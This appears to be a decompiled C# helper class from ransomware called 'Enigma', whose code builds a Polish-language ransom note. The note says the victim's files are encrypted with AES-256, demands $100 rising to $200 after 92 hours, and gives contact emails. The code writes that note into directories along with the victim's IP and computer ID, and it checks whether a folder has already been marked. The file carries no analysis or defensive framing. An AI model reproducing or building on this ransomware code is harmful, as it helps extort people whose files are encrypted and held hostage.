using System;
using System.IO;
using System.Text;

namespace AESxWin.Helpers;

public static class StatusFile
{
	public static string StaticText
	{
		get
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine("//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine(" E.N.I.G.M.A        - -        R.A.N.S.O.M.W.A.R.E ");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine("//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine("//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine("Masz problem  znalezieniem potrzebnych ? Nie możesz otworzyć swoich plikow?");
			stringBuilder.AppendLine("Po otworzeniu ważnych plików widzisz tylko nic nie mówiący, dziwny ciąg znaków?");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine("Twoje istotne pliki zostały zaszyfrowane !");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine("Twoje zdjęcia, dokumenty, bazy danych, zostały zaszyfrowane nie mozliwym do zlamania algorytmem  AES-256");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine("Metody tej do szyfrowania zawartosci dokumentów uzywaja sluzby wywiadowcze i wojsko.");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine("//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine("Gdy to czytasz proces jest zakończony, wytypowane pliki zostały zaszyfrowane a sam program usunięty z Twojego komputera.");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine("Odzyskac Twoje dane mozna tylko przy pomocy dedykowanego programu deszyfrującego, wraz z jednorazowym kluczem wygenerowanym unikalnie dla Ciebie!");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine("Dwa pliki odszyfrujemy bez opłaty aby nie być gołosłownymi, za pozostałe będziecie Państwo musieli zapłacić 100$");
			stringBuilder.AppendLine("");
			stringBuilder.AppendLine(" ");
			stringBuilder.AppendLine("Aby odzyskać pliki skontaktuj się z nami pod adresem: 3NIGMA@0.PL lub 3nigma@firemail.cc");
			stringBuilder.AppendLine("Radzimy decydować się szybko, 92 godziny od zaszyfrowania opłata zostanie podniesiona do 200$.");
			stringBuilder.AppendLine("");
			stringBuilder.AppendLine("");
			stringBuilder.AppendLine("//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#");
			stringBuilder.AppendLine("");
			stringBuilder.AppendLine("");
			stringBuilder.AppendLine("Kontaktujac sie z nami pamietaj aby podac ID-Komputera i date");
			stringBuilder.AppendLine("");
			return stringBuilder.ToString();
		}
	}

	public static void WriteStatusFile(string directory, string ip, string computerId, DateTime date, string filename = "!....=-.$$$-ODZYSKAJ--DANE-$$$.-=....!.TXT")
	{
		try
		{
			string arg = date.ToString("dd-MM-yyyy HH:mm:ss");
			File.WriteAllText(Path.Combine(directory, filename), StaticText + $"IP={ip} ID={computerId} Data={arg}");
		}
		catch
		{
		}
	}

	public static bool StatusFileExist(string directory, string filename = "!....=-.$$$-ODZYSKAJ--DANE-$$$.-=....!.TXT")
	{
		return File.Exists(Path.Combine(directory, filename));
	}
}
